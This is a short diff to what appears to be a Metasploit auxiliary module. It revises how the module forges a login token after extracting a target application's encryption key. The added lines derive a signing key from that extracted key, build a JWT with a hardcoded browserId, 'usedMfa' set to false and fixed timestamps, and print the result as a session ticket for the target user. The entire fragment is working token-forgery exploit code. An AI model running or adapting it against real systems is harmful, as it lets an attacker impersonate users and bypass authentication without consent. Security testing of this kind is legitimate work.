@@ -331,9 +331,12 @@ class MetasploitModule < Msf::Auxiliary
       encryption_key = config_content_json['encryptionKey']
 
       print_good("Extracted encryption key: #{encryption_key}")
+      
+      encryption_key = (1...encryption_key.length).step(2).map { |i| encryption_key[i] }
+      encryption_key = encryption_key.join('')
 
-      jwt_payload = %({"id":"#{user_id}","hash":"#{Base64.urlsafe_encode64(Digest::SHA256.digest("#{target_username}:#{password_hash}"))[0..10]}"})
-      jwt_ticket = Msf::Exploit::Remote::HTTP::JWT.encode(jwt_payload.to_s, encryption_key)
+      jwt_payload = %({"id":"#{user_id}","hash":"#{Base64.urlsafe_encode64(Digest::SHA256.digest("#{target_username}:#{password_hash}"))[0..9]}","browserId":"VCuSIVFScjl4/6T8sqP/P8YG3Ru9iVsubJmnztmPuLA=","usedMfa":false,"iat":1770130254,"exp":1770735054})
+      jwt_ticket = Msf::Exploit::Remote::HTTP::JWT.encode(jwt_payload.to_s, OpenSSL::Digest::SHA256.hexdigest(encryption_key))
 
       print_good("JWT ticket as #{target_username}: #{jwt_ticket}")
 
